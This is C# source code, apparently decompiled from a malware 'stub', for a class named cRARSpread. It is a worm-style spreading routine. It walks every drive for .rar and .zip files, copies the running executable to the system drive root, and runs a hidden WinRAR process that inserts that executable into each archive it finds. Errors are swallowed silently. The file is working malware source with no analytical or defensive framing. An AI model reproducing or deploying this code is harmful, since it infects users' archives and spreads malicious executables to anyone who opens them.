using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Stub;

public class cRARSpread
{
	private static string string_0;

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	private static extern int GetShortPathName([MarshalAs(UnmanagedType.LPTStr)] string string_1, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder stringBuilder_0, int int_0);

	private static void smethod_0(string string_1)
	{
		try
		{
			string[] files = Directory.GetFiles(string_1);
			string[] array = files;
			foreach (string text in array)
			{
				if (text.Contains(".rar"))
				{
					smethod_1(text);
				}
				if (text.Contains(".zip"))
				{
					smethod_1(text);
				}
			}
			string[] directories = Directory.GetDirectories(string_1);
			string[] array2 = directories;
			foreach (string string_2 in array2)
			{
				smethod_0(string_2);
			}
		}
		catch
		{
		}
	}

	public static void RARSpread()
	{
		try
		{
			string_0 = Process.GetCurrentProcess().MainModule!.FileName;
			string[] logicalDrives = Environment.GetLogicalDrives();
			string[] array = logicalDrives;
			foreach (string string_ in array)
			{
				smethod_0(string_);
			}
		}
		catch
		{
		}
	}

	private static void smethod_1(string string_1)
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
			string path = folderPath.Replace(folderPath.Substring(folderPath.IndexOf("\\")), string.Empty) + "\\";
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe";
			if (File.Exists(text))
			{
				if (!File.Exists(Path.Combine(path, string_0)))
				{
					File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Path.Combine(path, string_0));
				}
				StringBuilder stringBuilder = new StringBuilder(255);
				GetShortPathName(Path.Combine(path, string_0), stringBuilder, stringBuilder.Capacity);
				StringBuilder stringBuilder2 = new StringBuilder(255);
				GetShortPathName(string_1, stringBuilder2, stringBuilder2.Capacity);
				try
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					string arguments = " a " + stringBuilder2.ToString() + " " + stringBuilder.ToString();
					processStartInfo.FileName = text;
					processStartInfo.Arguments = arguments;
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					Process.Start(processStartInfo);
					return;
				}
				catch
				{
					return;
				}
			}
		}
		catch
		{
		}
	}
}
